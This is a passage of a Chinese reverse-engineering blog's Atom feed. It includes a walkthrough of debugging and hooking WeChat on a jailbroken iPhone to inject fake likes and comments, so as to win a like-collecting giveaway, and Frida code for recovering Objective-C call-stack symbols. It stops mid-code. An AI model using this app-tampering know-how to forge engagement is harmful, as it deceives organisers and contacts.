<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-29T04:02:55.578Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T04:02:55.578Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+ppyJCM6WOrcJkHVktmxvhWfxMWxiYYQYLxxI66snyVggNZxSwsRYkiMPmLahk5MFaHxT8S5jymF9aFGNKeXUMhHkCxik85rEiXIo+1NywYFKSFyPNdkbL8RGy/xjHF/ezUfp3frZvTdA0OOeOay8aVuig5U2gRlFLAK6Ux7rdB4apl7VGdVtVxLHWoY9E/NsKRkf3rBhv4US1D2PnDNVy56AuHZbc/+5+4QuOYHaIgeeBHlxyerEZYJpqc4+8WRm9GEBJj2B08DdQm+8lKYozvp3Li9ZRCt3gAWgUd2BRqHG+yEjGjY3XykTvZta9sXqKwa81yy0BRoh06NPAWjuf2sdlAteYxlrJ0ZX4HDIc/PX62LUhpGQ5BRHU0gqTn448OsCY5pEg1L46ZRqHla066aJp1d24/eCXKbvfkgFlhhDMu8lMM+c+U4tRwzSlzrfdyUIoWuuVdu7ZD5seyN9Mr4vtA4r/tNSgsteMKq0y1oxA3RhJgz5EvfJ7qEAgqWngX50ur8mUF75U4w9NlpEoyqtro8vN8RqAOGxgK676HAHMeqX4xb/WGMQnChvEAwZrO0/NAu45OmTzf3mJXRyiTjVI6J05YB30fzquzl61p+PW3Tc1Ei7veij2qCKIpzUu81jglHdWUwGqeIm0JX3O73r6cFlmI3b3DZdhF/RGUfgxYGD9wTYmuxn63vjMUdEglWh26v8wKdFIvmiF5UA+Pdcyide6Q64n+PB9x4gwbQrlWnNO4qXer97kBC/kl50ICt/gCrV/ADbiWY8hi/Chn+W6bd47kk/lR70SSV8kMnBtq2vH7Fx+3H6XPrZj3M5yIi88rWMf1sPCkzpm40BRncqnKmEKMZETd4U+PIPTcHZX5BEBcLH7WxeqOvQ3HbJ4jyo6KIhDe1N2P2Iia1uWFSY3fu16JQuLHnqAYIwCYX8tUxd38fuDGm/sfbE4s3Qq5hpGHI4jPIyqzoLVLqVQB1sqodRnVY0VgE3+/cb5LjOsyjfxUM5st1QJZMyvTKtPXpIOz3QwHI6UL4lI3Du4PHFyNdKE39Ry+ke9iywVED2fm6gx/Qc3utORAdwnGlxJXRQ+SPWF1jZMpweedWXCODM02mR0xbjq4YscKKuaWgApHU0B9AK8t7Qn+g1FUiQej4dwZro8P5KwaAp12VuJN7Se7JzxlasAI3YeUREfuHbf8ieUQHBoZWgnJXGrw9qEKXiCvvCzu1TUy7gDKuNJ45mPU5wCO5X3aZpPKwZoxILrVORSnR0kkKGpNNHloaDQC7nwxW7FBgtB7aBGReAOv4AOLwfU1n9S/YK2EuGJ6usvSNyv0NyN+OmWqRYoyw3zJX6829b1SM5AS/QIF/Y2XORKiib7v17p4UAZ3MW8H/mWRbxn1rXhvbP4yV4JgeMXHJFTJL023+iU9bRRteeLAuiaRDthsw9dKA/E3YeATZob6/q/3/qaycd6YZLuz6pdSDG5fI715g==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-27T07:02:41.266Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 